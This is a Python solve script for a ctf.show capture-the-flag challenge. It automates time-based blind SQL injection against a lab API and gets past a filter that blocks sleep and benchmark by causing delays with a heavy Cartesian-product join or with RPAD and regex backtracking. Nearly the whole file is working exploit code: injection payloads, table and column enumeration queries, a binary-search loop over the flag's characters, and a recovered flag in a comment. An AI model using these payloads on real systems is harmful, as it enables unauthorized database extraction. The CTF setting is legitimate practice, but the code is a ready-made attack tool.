"""
Author : feng
"""
import time
import threading
import requests

'''
查询语句

       where id = ($id);
      
返回逻辑

    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep|benchmark/i',$str);
    }   
      

笛卡尔积注入
'''

url = "http://452b06bd-6246-4dfb-b1c0-df8c7ea9c25c.chall.ctf.show:8080/api/index.php"
flag = ''
for i in range(1, 100):
    # lock = threading.Lock()
    min = 32
    max = 128

    while 1:
        # lock.acquire()
        j = min + (max - min) // 2
        if j == min:
            flag += chr(j)
            print(flag)
            if chr(j) == '}':
                exit()
            break
        # payload = "1) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),1)#".format(
        # ctfshow_flagxc,ctfshow_info
        # payload = "1) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'),{},1))<{},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),1)#".format(
        # id,flagaac,info
        # 不能一次查完越到后面越不准确
        payload = "1) or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),{},1))<{},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),1)#".format(
        # payload = "1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),{},1))<{},benchmark(3000000,md5(1)),1)#".format(
        # payload = "1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb limit 5,5),{},1))<{},benchmark(3480500,md5(1)),1)#".format(
            i, j)
        # ctfshow{2+6bf7c3-%ac0,4d87-
        # ctfshow{246bf8c3-4ac0-4d8e-8690-de2f060b9ee0}

        data = {
            'ip': payload,
            'debug': 0
        }
        try:
            r = requests.post(url=url, data=data, timeout=2.1)
            # time.sleep(0.5)
            min = j
        except:
            max = j
        time.sleep(0.3)
    time.sleep(1)
        # lock.release()


'''
RPAD(str,len,padstr)
返回字符串str，用padstr右填充字符串，长度为len个字符。 如果str大于len，则返回值缩短为len个字符。


url = "http://c55c1b89-83c9-4b5b-b78c-38c91df1eb34.chall.ctf.show:8080/api/index.php"
flag = ''
times = "concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) rlike '(a.*)+(a.*)+b'"
for i in range(1, 100):
    # lock = threading.Lock()
    min = 32
    max = 128

    while 1:
        # lock.acquire()
        j = min + (max - min) // 2
        if j == min:
            flag += chr(j)
            print(flag)
            if chr(j) == '}':
                exit()
            break
        # payload = "1) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{},{},1)#".format(
        # ctfshow_flagxca,ctfshow_info
        # payload = "1) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxca'),{},1))<{},{},1)#".format(
        # id,flagaabc,info
        # 不能一次查完越到后面越不准确
        payload = "1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxca),{},1))<{},{},1)#".format(
        # payload = "1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),{},1))<{},benchmark(3000000,md5(1)),1)#".format(
        # payload = "1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb limit 5,5),{},1))<{},benchmark(3480500,md5(1)),1)#".format(
            i, j, times)
        # ctfshow{2+6bf7c3-%ac0,4d87-
        # ctfshow{246bf8c3-4ac0-4d8e-8690-de2f060b9ee0}

        data = {
            'ip': payload,
            'debug': 0
        }
        try:
            r = requests.post(url=url, data=data, timeout=0.5)
            # time.sleep(0.5)
            min = j
        except:
            max = j
        time.sleep(0.3)
    time.sleep(1)
        # lock.release()


'''
